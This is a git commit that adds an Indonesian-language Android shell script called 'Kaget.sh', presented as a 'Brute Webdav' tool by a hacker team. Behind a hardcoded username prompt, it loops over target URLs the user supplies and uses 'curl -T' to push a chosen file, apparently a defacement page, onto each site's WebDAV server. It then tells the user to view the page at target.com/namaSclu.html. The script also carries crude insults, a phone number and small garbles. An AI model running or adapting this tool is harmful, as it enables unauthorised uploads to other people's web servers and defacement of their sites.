7b5971d4fb0ba0c4bf6ab5cbc3723d285057d055
Mrs0sTamvan <43491909+Mrs0sTamvan@users.noreply.github.com>
2018-11-16 22:11:14 +0700

    Create Kaget.sh

---
+++ Kaget.sh
@@ -0,0 +1,107 @@
+#system/bin/sh
+#.::Undead Slayer::.
+#Haha Lu Mo Recode
+#Ga Malu Lu sama Jembod
+
+#variables
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+echo $red"=======================Undead$white Slayer========================="
+echo $cyan"#                -==Undead Tersakiti==-                     #"
+echo $red"=======================Undead$white Slayer========================="
+echo $cyan
+read -p"#                   .:[Username Nya]:. :" us
+if [ $us = "Kamvang" ];then
+sleep 1
+sh huh.sh
+clear
+else
+echo $red"-======================Username salah kontol====================-"
+echo $white"-=====================Kalo Bingung Hub Gua-======================"
+echo $red"-=========================08878819132-========================="
+sleep 1
+clear
+fi
+
+echo $cyan ""
+figlet -f standard "Kaget Kan"
+
+echo $red"-=========================BruteWebdav=========================-"
+echo $white"Author : T3RK3DJ03D_12"
+echo $white"Tools  : Brute Webdav"
+echo $white"Team   : Hallu Cyber Team And 2E4H"
+echo $white"pesan  : Ga tau Gua pusing Kentod"
+echo $red"-=========================BruteWebdav=========================-"
+
+##############################
+# CTRL C
+#############################
+trap ctrl_c INT
+ctrl_c() {
+clear
+exit
+}
+echo ""
+echo $yellow"Masukin Nama Sc nya, Inget Harus di luar folder"
+read -p "[+]" cok;
+echo $red"-==================================================-"
+echo $green"Target nya cok                               "
+read -p "Kaget@root~#" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok                      "
+echo $blue"Done Cok                                      "
+echo $blue"-==================================================-"
+echo $green"Target nya cok"
+read -p "Kaget@root~#" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $yellow"-==================================================-"
+echo $green"Target nya cok"
+read -p "Kaget@root~#" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $cyan"-==================================================-"
+echo $green"Target nya cok"
+read -p "Kaget@root~#" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $purple"-==================================================-"
+echo $green"Target nya cok"
+read -p "Kaget@root~#" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+ho $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $white"-==================================================-"
+echo $green"Target nya cok"
+read -p "Kaget@root~#" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $red"-==================================================-"
+echo $green"Target nya cok"
+read -p "Kaget@root~#" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $blue"-==================================================-"
+echo -e $green"Target nya cok"
+read -p "Kaget@root~#" Dead;
+curl -T /storage/emulated/0/$cok $Dead
+echo $cyan"Nihh Salin => $Dead/$cok"
+echo $blue"Done Cok"
+echo $blue"-==================================================-"
+
+
+echo ""
+echo $cyan"Cara Mengaksesnya Ketik Http://target.com/namaSclu.html"
+echo $cyan"Thanks Semoanya"
+
